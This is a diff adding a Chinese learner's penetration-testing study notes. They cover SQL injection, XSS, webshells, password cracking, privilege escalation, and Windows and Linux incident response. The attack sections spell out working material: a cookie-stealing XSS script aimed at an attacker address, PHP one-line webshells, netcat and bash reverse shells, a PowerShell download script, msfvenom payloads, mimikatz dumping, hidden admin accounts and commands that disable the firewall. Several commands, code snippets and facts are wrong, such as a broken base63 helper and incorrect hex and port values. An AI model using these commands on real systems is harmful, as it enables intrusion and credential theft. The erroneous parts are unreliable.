@@ -1,0 +1,2026 @@
+没有兴趣，何来成就，难道就只是为了咕噜猫？hahaha（听不懂吧，没关系，只是因为加密了，你能从我的笔记中找到答案么嘿嘿嘿嘿！！！）
+
+注意：以下内容仅记录本人当时学习时任然不知的相关知识。笔记草率，可能有错，仅供参考。我会慢慢完善的哦！
+
+### 写在前面：
+
+1.业界比较好的信息安全网站：
+
+freebuff：这个看来你已经找到了
+
+secWiKi：ennnnn
+
+安全客：收集了各大SRC哦，如果你哪一天灵感大发发现一个漏洞或者业务逻辑Bug，赶快去提交吧，也可以去补天，漏洞盒子提交哦！还有众测平台哈哈哈。还有，前段时间发现美团外卖安卓app有时候在下单选地址页面可以看到别人的隐私信息哦，可能就是个bug吧hahahaha
+
+看雪：主要为移动安全
+
+你要是问我这些哪里来的，我只能说华为的安全工程师天天在上这些网站，哈哈哈
+
+2.如果我笔记当中看到自己不知道的业界名词或者知识，马上去百度一下哦！
+
+基本完整渗透测试框架图：
+
+![](https://image.3001.net/images/20201008/1602166886_5f7f206632b068776f123.jpg!small)
+
+以下是跟着四个导师学习实践的学习笔记哦，可能有些只有我自己懂，但我会慢慢完善的呢，导师我就不介绍了，做安全的对这些很敏感的呀，所以除了知识就不要相信我的话，会迷糊你的，这些叫什么，social
+engineering哈哈哈，导师都是企业实践五六年的老行家了，等保测评师呀，渗透测试高级工程师呀等等等的。
+
+Day1：谈心培养兴趣
+
+Day 2:
+
+Chmod
+
+Mv 修改文件名
+
+http请求包含：
+
+请求行
+
+请求头
+
+请求正文
+
+  
+
+Get请求没有请求正文
+
+  
+
+GET vs POST
+
+1.请求参数
+
+-get
+
+  
+
+501 方法未实现
+
+3xx 重定向
+
+  
+
+Sql 注入：
+
+1.判断 '或者"
+
+2.注释：# 或者 - -
+联合查询：
+
+1.Order by
+
+2.union select 1,2
+
+3.库 database()
+
+4.表 information_schema.tables
+
+5.列 union select column_name,2 from information_schema.columns where
+table_schema=database() and able_name='users'#
+
+6.内容 union select user,password from users#
+
+And ascii(mid((select user from user 0,1),1,1))>96
+
+布尔注入(暴力注入)：
+
+And 1=1
+
+And 1=2
+
+库
+
+表 exists(select * from users)
+
+列 exists(select 列名 from users)
+
+内容 and select user from users limit 1,2 / select mid("hello
+word",2,1)从第二个开始取一个
+
+  
+
+0-9: 48 0x30
+
+a-z: 97 0x61 select ascii('A')
+
+select ascii('A')
+
+A-Z 65 0x65
+
+URL编码：%号开头 ，%20就是空格
+
+Sleep()延时用法 Select if(exist(select * frrom user),sleep(5),3)
+
+作业：hub.docker.com
+
+3,5,9题
+
+Docker pull
+
+Docker run
+
+Day3:
+
+comcat（“hell”,"word!"）拼接
+
+Select ord(':') 查看accii
+
+Hex(68) 查十六进制
+
+Group_concat(username,0x3a,password)一行显示
+
+-报错注入：
+
+-floor
+
+|
+
+Select floor（（rand（0）*2）  
+  
+---|---  
+  
+  
+
+|
+
+Rand(0)随机数  
+  
+-updatexml(1,comcat(0x7e,version(),0x7e),3) version（）可以替换成sql语句
+
+-extractvalue 同理上
+
+-二阶注入：
+
+-insert into users claus('admin','pwd')
+
+-update usersset pwd='123' where name='name'
+
+-万能密码
+
+-文件读写
+
+-前提：
+
+-File
+
+-my.cnf/my.ini
+
+-secure_file_priv=''
+
+-读文件
+
+-load_file ('path')绝对路径
+
+Etc/passwd存放用户信息
+
+-写文件
+
+-into outfile 'path'
+
+-into dumpfile 'path'
+
+-绕过技术
+
+-替换or=|| and =&&
+
+-大小写
+
+-双写 对抗这个可以用循环持续过滤，直到没有
+
+-内联注释
+
+-空格 %20+ --- 、））、 %a0 %0b --=ss %2b
+
+-注释 # +--+ ----> 闭合 就是将后面的也闭合
+
+-POST
+
+  
+
+-sqlmap
+
+-基本使用
+
+1.判断
+
+|
+
+Sqlmap -u "url"  
+  
+---|---  
+  
+2.库
+
+|
+
+sqlmap -u "url" --dbs /--current-db  
+  
+3.表
+
+|
+
+sqlmap -u "url" -D db --tables  
+  
+4.列
+
+|
+
+sqlmap -u "url" -D db -T tb --columns  
+  
+5.内容
+
+|
+
+sqlmap -u "url" -D db -T tb -C col --dump  
+  
+对于post类型
+
+|
+
+Sqlmap -r 1.txt  
+  
+  
+
+|
+
+Sqlmap -r 1.txt -vv -D security --v显示详细信息，包括输入了什么内容  
+  
+  
+
+|
+
+  
+  
+  
+  
+
+-写tamper
+
+DAY 4
+
+-命令执行
+
+-多条命令符号
+
+；
+
+||(或者)前面为假的时候后面才可以执行
+
+|
+
+&& 一个&
+
+后台运行
+
+Wget
+
+Echo
+
+-文件包含
+
+-#include<stdio.h>
+
+-PHP include() require()
+
+Config.inc.php --db
+
+例子：http://localhost:8001/vulnerabilities/fi/?page=../../../../../etc/passwd
+
+-LFI
+
+-无论后缀名是什么，只要里面有php代码，都会被执行
+
+-php伪协议
+
+-php://filter/read=convert.base64-encode/resource=1.php
+
+<?php
+
+System('whoami')
+
+?>
+
+-RFI
+
+-<http://localhost:8001/vulnerabilities/fi/?page=http://192.168.38.1/1.txt>远程文件包含
+
+-
+-XSS(html注入)
+
+-js语句
+
+-document.cookie获取cookie
+
+-存储型
+
+<script>document.location='http://你的地址'+document.cookie</script>
+
+<script>
+
+document.write("img src='http://"+document.cookie+"'/>");
+
+</script>
+
+-文件上传（抓包，发送reper，修改后缀）
+
+-一句话
+
+<?php @eval（$_post[1]);?>
+
+<?php@system($_get[1]);?>
+
+<?php $_get[0]($_post[1]);?> 连接的时候在链接后面加0=access
+
+客户端工具：
+
+蚁剑
+
+原理;1=@eval(base_decode($_POST[2]));$2=system('ls …/');
+
+-检查
+
+-客户端js检测
+
+-后缀名
+
+-大小写 php3,,php4,php5 ,phtml
+
+Apache:
+
+-.htaccess
+
+内容：AddType application/x-httpd-php gif 含义：将gif文件按照php解析
+
+-类型
+
+-image/gif
+
+-image/png 这些是contentType属性
+
+-image/jpeg
+
+-文件头
+
+-GIF89a gif文件头
+
+-文件内容
+
+<?php $_GET[0]($_post[1]);?> ?0=assert
+
+  
+
+Day 6
+
+-xss
+
+-beef软件
+
+-蓝莲花
+
+-文件包含
+
+-php://input
+
+-文件上传
+
+-00截断
+
+-webgoat
+
+-hashcat -a 0 -m 0 md5.hash 字典路径
+
+Day7
+
+-XXE
+
+chown属组 Eg: chown www-data upload
+
+chgrp改组
+
+Reboot shutdown -r now重启
+
+Init 0 关机
+
+Day8
+
+-jwt json格式的web token
+
+-HS256 就是HMAC-SHA256
+
+Hashcat -a 0 -m 1450(Sash的id) hash文件 字典路径
+
+def hmac_base63(key,message): return
+base63.urlsafe_b64encode(bytes.fromhex(hmac.new(key,message,hashlib.sha256).hexdigest()))
+
+Day9
+
+-OWASP top 10
+
+-敏感信息泄露
+
+-传输
+
+-存储
+
+-不安全的反序列化
+
+-
+<?php
+
+$Aaa=arry("1","2"，123)；
+
+Echo serialize($aaa)；
+
+?>
+
+  
+
+结果：
+
+书籍：《OWASP测试指南》
+
+《黑客攻防技术宝典-web实战篇》
+
+网站：
+
+Vulhub.org漏洞测试靶场
+
+Vulnhub.com
+
+-框架
+
+-Flask
+
+-
+-多线程
+
+-
+Day10
+
+-cisp
+
+软件网站：
+
+-Ip138
+
+-licence
+
+安全产品：
+
+-网关类：EW,ZPS,FS
+
+-终端类：AV,补丁，NAC网络访问控制，EDR，DLP
+
+-审计类：日志审计，数据库审计，VPN，堡垒机
+
+-监控类：APT，SOC，蜜罐
+
+Day 11:
+
+-等保
+
+Day12:
+
+-php7木马实现
+
+-一句话
+
+-poc 概念验证
+
+-paylood
+
+-链路层 CRC
+
+-网络层 ：包，只有包头
+
+-dns解析用udp，服务器和服务器之间用tcp
+
+-vi命令
+
+-x删除当前字符
+
+-dd删除当前行
+
+-comm -1 1.txt 2.txt 找相同和不同
+
+-diff 1.txt 2.txt 找不同
+
+-diff -c 1.txt 2.txt 查看所有信息 -u的话，去重后显示在一起
+
+-vimdiff 1.txt 2.txt
+
+-ps查看进程
+
+-tail 1.txt
+
+-tail -f 1.txt 监控文件后面的增长 vim添加内容似乎不行
+
+-watch -n 5 监控 -n后面是几秒刷新
+
+-watch -n 5 w 监控w命令
+
+-wget下载文件
+
+-curl -o下载文件
+
+-环境准备
+
+-windows7
+
+-windows2008R2 <https://msdn.itellyou.cn/>
+
+-linux
+
+-ubuntu 14/metasploit2 vulnhub.com
+
+-工具
+
+-瑞士knife netcat
+
+-nc -lvp 3333开一个端口
+
+-nc -l localhost 4444链接端口
+
+-n 不显示nds解析信息
+
+-v 显示详细信息
+
+-e 后面接命令
+
+-文件传输
+
+-接受方 nc -lvp 4444 > 1.txt
+
+-发送方 nc ip/域名 端口 < 1.txt
+
+-绑定shell
+
+-服务器 nc -lvo 444 -e cmd.exe
+
+-攻击方 nc -nv ip port -e cmd.exe
+
+-反弹shell
+
+-攻击者
+
+-nc -lvp 444
+
+-服务器
+
+-nc -nv ip port -e cmd.exe
+
+Day12
+
+-信息收集
+
+-主动
+
+-DNS
+
+-port/os
+
+-nmap
+
+-nmap -p- -Pn -n ip
+
+-nmap -p 21 -sV -Pn -n --script==xx ip
+
+-Nmap -O ip
+
+-Nmap -A -F ip
+
+-nmap -Pn -n --script=ftp-vsftpd-backdoor 192.168.174.129
+
+-vuln scan
+
+-debian6 amd64 .deb sudo install ./nessusxxxx.deb sudo service nessusd start
+
+-web scan
+
+-AWVS
+
+-IBM appscan
+
+-hp webinspect
+
+-xray
+
+-xary webscan --listen 127.0.0.1：7777 --html-output 1.html
+
+-和bp联用
+
+-设置user options 下的connections
+
+-destination host:ip
+
+-proxy host:127.0.0.1
+
+-proxy port:7777
+
+  
+
+-被动
+
+-whois 注册信息
+
+-站长之家
+
+-微步
+
+-google hacking
+
+  * -site:
+  * -filetype:文件类型 前面加-号表示不看该类型
+  * -inurl:
+  * -error：曾经报过哪些错误
+  * -GHDB
+
+  * <https://searchdns.netcraft.com>
+  * Recon-ng
+  * -github
+  * Shodan/fofa/zoomeye
+  * <https://securityheaders.com/>
+  * <https://ssslabs.com/>
+  * <https://pastebin.com/>
+  * Theharvester 查邮箱
+  * 社工库
+  * 网盘/历史漏洞信息/stack overflow
+  * NDSRecon
+
+-记录
+
+  
+
+Megacorpone.com
+
+Day13
+
+-口令破解
+
+-字典
+
+Wordpass.com
+
+-生成(社会工程学字典)
+
+-cewl
+
+|
+
+cewl -d 2 -m 6 -w ./1.txt <http://www.megacorpone.com>  
+  
+---|---  
+  
+Sudo apt install crowbar
+
+在线破解（远程）：medusa hydra
+
+网络服务（db,ftp,ssh,rdp）
+
+Web-burp
+
+Http basic
+
+离线破解（本地) hash-- hashid命令识别哪一种hash
+
+-windows
+
+C:\windows\system32\SAM -注册表-system
+
+-hash为：NT/NTLM
+
+-工具pwdump7/samdump2
+
+-linux
+
+-/etc/passwd
+
+-/etc/shadow
+
+-hash512 在做加密
+
+-rainbow彩虹表 地址：
+
+  
+
+-内存里-明文
+
+-mimikatz
+
+Privilege::debug
+
+Sekurlss::logonpasswords
+
+-mysql
+
+-other hash
+
+Day14
+
+-实施流程
+
+与技术对接人沟通
+
+  
+
+-默认端口号（全局端口）范围0-1035
+
+防火墙/ips/icg配置模式
+
+-桥模式（透明模式）
+
+-代内管理
+
+-代外管理
+
+-路由模式（不常用）
+
+-旁路模式
+
+Day15
+
+-ICG管理方式
+
+-Web
+
+-Console 波特率为9600 icgadmin/netentsec
+
+-Ssh(13289)
+
+-防火墙默认管理地址：https://10.0.0.1
+
+-
+msfvenom
+
+来自 <<https://blog.csdn.net/ZmeiXuan/article/details/78061755>>
+
+策略路由优先级
+
+-主机路由->直连路由->静态路由（包含动态路由）->策略路由->ISP路由->默认路由
+
+Day16
+
+-漏洞分析/利用
+
+-应用层：web
+
+-通用的owasp top10
+
+-CMS：wordpress/discuz/joomla
+
+-开发框架
+
+-php：thinkphp
+
+-java：SSM
+
+-Python：Flask/Django
+
+-通用框架：es
+
+-中间件：tomcat/weblogic
+
+CVE/exploit-db这是个网站/searchsploit
+
+  
+
+-数据库：
+
+-关系型：mysql、msssql，oracle
+
+-非关系：redis/mongodb
+
+-操作系统
+
+-windows
+
+-445
+
+-linux
+
+-脏牛(dirtycow)
+
+-网路层：
+
+变量都以$开头
+
+Fuzz 模糊测试
+
+Phpinfo()
+
+Substring(database_version(),1,1)
+
+从
+
+我是谁
+
+没有绝对安全
+
+Github: list
+
+kali重启网络命令
+
+Sudo systemctl restart networking
+
+Sudo systemctf restart NetworkManager
+
+0-65536
+
+2Mbps=0.25MBps
+
+  
+
+linux下写一句话注意转义
+
+权限不高：
+
+提权：
+
+-本地/远程
+
+-利用OS漏洞
+
+-数据库
+
+-第三方应用
+
+  
+
+漏洞利用
+
+-.py
+
+-.php
+
+-.pl perl语言
+
+-.rb ruby语言 一般是给msf用的
+
+-.c gcc编译后运行
+
+-.txt /.md webapps类的漏洞
+
+-扫后台
+
+-dirb工具
+
+  
+
+Linux 权限
+
+-rw-r--r-- 1 这个数字对于目录，所有目录都有两个子目录，.和..
+
+10位
+
+User group other
+
+-：普通文件
+
+d:目录
+
+l:链接（快捷方式）
+
+b/c:设备文件
+
+-rws r-x r-x 当中的s表示其他用户执行文件的时候以文件拥有者的权限执行
+
+8进制表示是4755，other里显示为t，表示tmp临时文件
+
+linux和windows提权在github上很多
+
+  
+
+Passwd 文件中：
+
+root:x:0:0:root:/root:/bin/bash x一位表示口令占位符，如果没有表示没有密码
+
+shadow文件中：
+
+root:!:18470:0:99999:7::: ！表示无法登录，不可登录，锁定，18470表示与1970年一月一日相减的天数，也就是上次修改密码的时间
+
+linux防火墙
+
+Iptables
+
+Iptables
+
+Setenforce
+
+查看os信息：
+
+Os-release
+
+Lsb=release
+
+Etc/sudoer.d这个文件下添加的用户可以使用sudo
+
+  
+
+找有s权限的文件Sudo find / -perm -4000 2>/dec/null
+
+touch创建文件
+
+Echo “`命令`”
+
+|
+
+反引号表示当成命令执行  
+  
+---|---  
+  
+DAY17
+
+-windows基础
+
+帮助文档命令/?
+
+-系统信息
+
+ver
+
+Winver
+
+systeminfo
+
+-用户
+
+-计算机管理：compmgmt.msc
+
+-SAM本质是注册表-命令为：regedit
+
+组策略命令为：gpedit.msc
+
+SID：
+
+administrator 500
+
+Guest 501
+
+Net user 查看用户
+
+Net user 用户名 密码 改密码
+
+Net user 用户名 /active:yes激活账户
+
+其他请看帮助文档
+
+用户名后面加$可以影藏账户
+
+Net localgroup administrators 查看这个组
+
+-防火墙
+
+关闭防火墙
+
+-net stop shareacce
+
+-netsh firewall set opmode disable
+
+-netsh advfirewall set allprofile state off
+
+-开3389
+
+Reg add "HKLM\system\currentcontrolset\control\terminal server" /v
+fDenyTSConnections /t reg_dword /d 0 /f
+
+-查看端口
+
+-reg query "HKLM\system\currentcontrolset\control\terminal server\winstation\rdp-tcp" /v portnumber
+
+  
+
+Msfvenom生成木马之后，进入到msfconsole当中使用如下命令：Use exploit/multi/handler
+
+-改环境变量命令
+
+-export
+
+Su tom切换用户
+
+Day18
+
+-gobuster工具
+
+nmap提权
+
+git提权
+
+awk提权
+
+msf监听exploit/mu msfvenom生成:msfevom -p payload lhost=ip -f exe -a x64 -o
+shell.exe
+
+Day19
+
+firewall
+
+-linux关闭防火墙
+
+-service iptables stop
+
+-sysytem
+
+-bash -I >& /dev//tcp/ip/端口 0>&1
+
+-powershell
+
+-端口转发
+
+-msf可以做
+
+rdesktop工具 命令：rdesktop ip
+
+第一步，通过msfv生成一个反弹exe，传给对方
+
+第二部，msfc开启监听，对方运行exe
+
+第三步，链接之后，执行远程桌面端口转发命令
+
+第四部。你的本机链接自己的3389，使用rdesktop命令
+
+VM Network
+
+-Net
+
+-bridge
+
+-host only
+
+  
+
+linux默认的代理/etc/proxychains
+
+  
+
+nmap扫描最好加-Pn（禁止ping扫描）因为协议原因，比如
+
+  
+
+Day20
+
+Msf -- post
+
+  
+
+Cobalt strike -- 红队
+
+通道：
+
+-dns / icmp
+
+冰蝎 西刺代理（免费代理换ip）
+
+windows域名中使用kerbors认证--黄金票据--SSO
+
+-tgt票据许可票据
+
+msf中域中经常使用提权的模块，search psexec
+
+Day21
+
+文件传输
+
+Ftp
+
+-filezilla/server-u
+
+-pure-ftpd/vsftpd
+
+Put 和get
+
+Http
+
+Echo $webclient = New-Object System.Net.WebClient >>wget.psl windows下开一个web客户端
+
+Echo $url = "[http://192,。168.174.128:4444/hello.txt](../hello.txt)">>wget.psl
+kali下的文件地址
+
+Echo $file="exploid.txt" >> wget.psl 存到windows下的文件名
+
+Echo $webclient.DownloadFile($url,$file) >>wget.psl 下载文件
+
+  
+
+以下执行的前提是kali下开个web服务
+
+Powershell.exe -ExecutionPolicy Bypass -Nologo -Nonlnteractive -Nologo
+-noninteractive -noprofile -file 文件名 或者
+
+Powershell.exe -ExecutionPolocy Bypass -File 文件名
+
+  
+
+Powershell.exe (new-object system.net.webclient).downloadfile
+
+  
+
+杀软绕过
+
+-特征码绕过
+
+-沙箱
+
+静态
+
+-PE/ELF
+
+-IDA PRO
+
+动态
+
+-调试
+
+-沙箱 -- 行为-监控文件/注册表/网络连接
+
+shellter工具，将代码注入到正常的PE文件当中，比如notepad.exe，而且必须是32位的程序
+
+empire工具，类似msf，powershell编写，大多为powershell模块
+
+权限维持
+
+-windows
+
+-shift
+
+sethc.exe
+
+-映像劫持
+
+-远控木马
+
+-linux
+
+-suid
+
+-ld_preload
+
+清理痕迹
+
+  
+
+Metasploit3靶机渗透
+
+  
+
+binwalk命令分离图片是否是多个文件
+
+Knock ip 端口
+
+查看Knockd.conf可以使用knock技术
+
+  
+
+windows下查看文件属性命令
+
+Sttrib
+
+windows下加密有EFS和
+
+Bitlocker(对硬盘加密)
+
+windows下icacls是改权限命令
+
+  
+
+linux下lsattr查看文件属性
+
+  
+
+内网渗透代理不行可以用vpn或者frp
+
+Day22
+
+<https://hackthebox.eu>靶机练习
+
+  
+
+Su -u#-1 root
+
+  
+
+windows的smb远程登录
+
+Win+R中输入\\\\+ip
+
+  
+
+Day23
+
+msf中的smb_passwd模块
+
+winrm服务：windows远程登录管理 nmap扫出来会显示wsman
+
+打印机常用的用户名svc-print和svc-scan
+
+  
+
+Msman 默认端口5895
+
+  
+
+web
+
+web靶机实践地址：portswigger.net/web-security
+
+渗透：
+
+Hackthebox
+
+Vulnhub.org
+
+多主机：
+
+Labpentestit.ru
+
+  
+
+<https://www.pentesteracademy.com/course?id=11>
+
+<https://www.hackingarticles.in/>
+
+fuzz测试
+
+  
+
+Oracle:
+
+内置表DUAL
+
+oracle数据库一定存在dual表，而且select后面一定要加from
+
+查询版本：
+
+Select banner from v$version
+
+查询库：
+
+Select name from v$database
+
+查询表:
+
+select Table_Name, Tablespace_Name
+
+from Dba_Tables
+
+where Tablespace_Name = 'USERS';
+
+或者
+
+Select table_namefromall_tableswhereowner='大写用户名';
+
+查询列:
+
+sql1：select column_name from all_tab_columns where table_name='table1';
+
+sql2：select column_name from user_tab_columns where table_name='table1';
+
+查询当前数据库权实例名
+
+方法一：select instance_name from v$instance;
+
+方法二：show parameter insta
+
+模板注入
+
+  
+
+模板注入
+
+  
+
+Day24
+
+应急响应
+
+-事件状态判断-了解情况
+
+-临时处置
+
+-信息收集分析
+
+-事件处置
+
+-事件防御
+
+Windows应急常用命令（如果net如果不可以，可以使用net1尝试）:
+
+-net user
+
+-net localgroup administrator
+
+-net session
+
+-net start
+
+-net net use
+
+-Net share
+
+-net view
+
+-net use \\\ip\ipc$ "密码" /user:"用户名"
+
+  
+
+-netstat -ano
+
+-netstat -an |findstr 3389
+
+  
+
+创建隐藏用户
+
+-net user admin$ 111
+
+  
+
+Schtasks /query /fo LIST /v获取本机计划任务
+
+  
+
+Findstr 参数 “内容””文件或目录“
+
+Findstr /s /I "Hello"
+
+  
+
+Systeminfo
+
+Wmic process
+
+Wmic cpu get name 获取cpu型号
+
+  
+
+Tasklist /svc
+
+Query user
+
+Certutiil -hashfile 文件名 查看文件md5
+
+Netsh wlan show profile WIFI-name key=clear
+
+  
+
+attrib修改文件属性
+
+Windows+R运行命令：
+
+Gpedit.msc组策略
+
+Regedit
+
+Msinfo32
+
+Msconfig
+
+Services.msc服务
+
+Compmgmt.msc计算机管理
+
+Taskschd.msc
+
+Lusrmgr.msc 本地用户和组
+
+Eventvwr.msc事件查看器
+
+Control
+
+notepad
+
+mstsc远程登录
+
+  
+
+关键目录
+
+%WINDIR%
+
+%WINDIR
+
+  
+
+系统日志
+
+c:\windows\system32\winevt\Logs\System.evtx
+
+安全日志
+
+c:\windows\System32\winevt\Logs\security.evtx
+
+应用程序日志
+
+…..Application.evtx
+
+  
+
+系统日志
+
+系统启动ID
+
+|
+
+12  
+  
+---|---  
+  
+事件日志服务启动
+
+|
+
+6005  
+  
+……关闭
+
+|
+
+6006  
+  
+  
+
+|
+
+  
+  
+  
+安全日志
+
+事件id
+
+4624
+
+|
+
+登录成功  
+  
+---|---  
+  
+4625
+
+|
+
+登录失败  
+  
+4720
+
+|
+
+创建用户  
+  
+登录类型
+
+10
+
+|
+
+远程桌面登录rdp  
+  
+---|---  
+  
+2
+
+|
+
+交互式登录  
+  
+3
+
+|
+
+文件共享登录(局域网）net use  
+  
+7
+
+|
+
+锁屏解锁  
+  
+5
+
+|
+
+服务启动（服务登录）  
+  
+常用抓包工具wireshark，tcpdump
+
+Ip.addr=192.168.174.128
+
+Ip.src=
+
+Ip.dst=
+
+  
+
+常用工具
+
+PC Hunter
+
+黑色是微软的并且签名的进程
+
+蓝色是有签名不是微软的进程
+
+红色是其他可能存在恶意的进程
+
+启动项查看工具Autoruns
+
+Everything
+
+|
+
+启动加载  
+  
+---|---  
+  
+  
+
+|
+
+  
+  
+  
+进程查看工具Process Explorer
+
+webshell查杀工具 D盾
+
+win日志查看工具
+
+  
+
+1.了解情况
+
+2.系统分析
+
+1.1查看对外链接
+
+1.2查看进程
+
+1.3查看计划任务
+
+1.4查看开机启动项
+
+1.5隐藏用户
+
+3.事件处置
+
+4.加固
+
+5.报告
+
+Day25
+
+linux基础
+
+Top
+
+|
+
+可以看cpu利用率 大写的P可以排序  
+  
+---|---  
+  
+Crontab -l 列出当前计划任务
+
+计划任务默认储存位置
+
+/var/spool/cron/
+
+/etc/anacrontab
+
+/etc/cron.d/
+
+/etc/cron.daily/
+
+/etc/cron.hourly/
+
+/etc/cron.monthy/
+
+/Etc/cron.weekly/
+
+/etc/crontab
+
+启动项
+
+/etc/inittab
+
+/etc/init/*.conf
+
+/etc/rc.d/rc.
+
+Netstat -antlp | more
+
+Ps aux
+
+Pstree -p 以树状图显示进程，-p并显示进程pid
+
+根据netstat定位出的pid，使用ps,分析进程
+
+Ps aux | grep pid
+
+/proc/目录
+
+Ls -al /proc/pid/exe
+
+|
+
+查看pid进程对应的文件  
+  
+---|---  
+  
+Ls -al /proc/*/exe
+
+|
+
+查看所有进程对应的文件  
+  
+find命令
+
+Find /etc -mtime -1 -type f -print
+
+|
+
+查找24小时内/etc下修改过的文件  
+  
+---|---  
+  
+特殊权限文件查看
+
+Find / -name *.jsp -perm 777
+
+|
+
+  
+  
+  
+---|---  
+  
+Find / -user root
+
+|
+
+查找用户root的文件  
+  
+Find / -group root
+
+|
+
+  
+  
+  
+Md5sum
+
+Md5sum 文件名
+
+|
+
+查看文件的md5值  
+  
+---|---  
+  
+Lsof
+
+Lsof abc.txt
+
+|
+
+显示开启文件abc.txt的进程  
+  
+---|---  
+  
+Lsof -c abc
+
+|
+
+显示abc进程现在打开的文件  
+  
+Lsof -p 1234
+
+|
+
+1234进程打开的文件和端口号  
+  
+Lsof -i:port
+
+|
+
+查看指定端口对应的程序  
+  
+bash中默认命令记忆1000个，保存在~/Bash_history，在各自用户的家目录下
+
+lsattr和chattr
+
+lsattr命令
+
+|
+
+用于显示文件属性  
+  
+---|---  
+  
+Chattr
+
+|
+
+执行改变文件或目录的属性  
+  
+Chattr +i
+
+|
+
+加了i权限，文件不可被修改  
+  
+日志排查
+
+Var/log/wtmp
+
+|
+
+记录成功的账户信息,等同于last  
+  
+---|---  
+  
+/var/log/lastlog
+
+|
+
+记录登录的用户，可以使用命令lastlog  
+  
+/var/log/userlog
+
+|
+
+  
+  
+  
+日志配置
+
+、/etc/r
+
+定位有多少ip在爆破主机的root账号
+
+Grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort |
+uniq -c | sort -nr | more
+
+登录成功的ip有哪些
+
+Grep "Accepted" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort
+-nr | more
+
+  
+
+  
+
+  
+
+登录日志
+
+More /var/log/secure
+
+Who /var/log/wtmp
+
+  
+
+  
+
+apache日志
+
+/var/log/apache2/*
+
+|
+
+Access_log和error_log  
+  
+---|---  
+  
+  
+
+Lastb
+
+|
+
+显示登录失败的信息  
+  
+---|---  
+  
+W
+
+|
+
+已经登录系统的用户列表  
+  
+Lastlog
+
+|
+
+所有用户最近一次登录信息  
+  
+  
+
+查看ssh先关目录是否有可疑的公钥存在，suth开头的文件
+
+~/.ssh/
+
+目录/etc/profile.d/下，系统会自动执行该目录下的所有shell脚本
+
+Strace -tt -T -e trace=all -p $pid根据异常进程运行
+
+busybox工具可以执行系统命令（linux中）
+
+chkrootkit工具
+
+Ssh-keygen
+
+|
+
+生成公钥  
+  
+---|---  
+  
+/.bash_history
+
+Stat filename查看文件的修改，创建等时间
+
+ssh公钥
+
+勒索病毒，主要是溯源
+
+流程
+
+事件隔离
+
+信息收集
+
+事件状态判断
+
+事件处置
+
+事件清除
+
+  
+
+断网，避免横向传播
+
+勒索病毒传播方式
+
+服务器
+
+利用漏洞
+
+软件供应链
+
+邮件
+
+挂马网页
+
+文件排查
+
+日志排查
+
+勒索病毒解密网站
+
+<http://www.nomoreransom.org/zh/index.html>
+
+  
+
+Day26
+
+挖矿病毒处理
+
+windows挖矿
+
+挖矿病毒处理流程
+
+了解情况
+
+移除木马
+
+后门排查
+
+分析日志
+
+漏洞修复
+
+Msinfo32命令
+
+进程
+
+服务
+
+驱动
+
+模块
+
+查看计划任务（taskschd.msc）
+
+D盾扫webshell
+
+系统日志，主要看安全日志-事件查看器里
+
+Security.evtx
+
+查看用户最近文件
+
+Win+R:%userprofile%\recent
+
+linux挖矿
+
+用户信息/etc/passwd-nologin和flaus的可以不看
+
+freebsd默认存在toor账号，uid为0，是可信账号，是root替代账号
+
+Lastlog
+
+Lostb登录错误的用户
+
+Last 源数据为wtmp（）和utmp（登录过的所有用户）
+
+Ps aux
+
+Ls alh /proc/pid
+
+Lsof -p pid
+
+bin目录下如果命令文件明显偏大说明命令被修改过，也可以看修改时间
+
+计划任务
+
+启动项
+
+Cat /var/log/messages查看系统日志
+
+Day27
+
+apache日志格式：NS
+
+IIS日志格式：w3c
+
+  
+
+apache配置文件httpd.conf
+
+  
+
+IIS默认日子目录：%systemroot%\system32\logfiles\
+
+Apache日志目录：
+
+  
+
+正则
+
+  
+
+linux上有个河马webshell查杀或者可以使用简单命令find /var/www/ -name .php|egrep|
+
+  
+
+xff请求端真实ip和代理，http头字段
+
+  
+
+Day28
+
+网页挂马<iframe标签
+
+js挂马
+
+css挂马
+
+Java挂马
+
+图片伪装挂马
+
+高级欺骗
+
+  
+
+  
+
+随笔：
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+
+  
+
+sudo -u#-1 /bin/bash
+
+  
+
+Service networking restart
+
+  
+
+Rpcclient -U tlavel 10.10.10.193 链接主机的445端口
+
+  
+
+Cat user.txt | cut -d '[' -f 1
+
+Awk -f ":" '{print $3}'默认awk是以空格分隔
+
+  
+
+### 写在最后：
+
+感谢各位小伙伴的查看，我会更加完善这个的，内容有些有些许错误，部分已经修改了，后续我会将我整理好的完整笔记发到网上供大家下载，笔记阅读确实比在这里感官上好一点哈哈哈，这里有些缩进的问题。
+
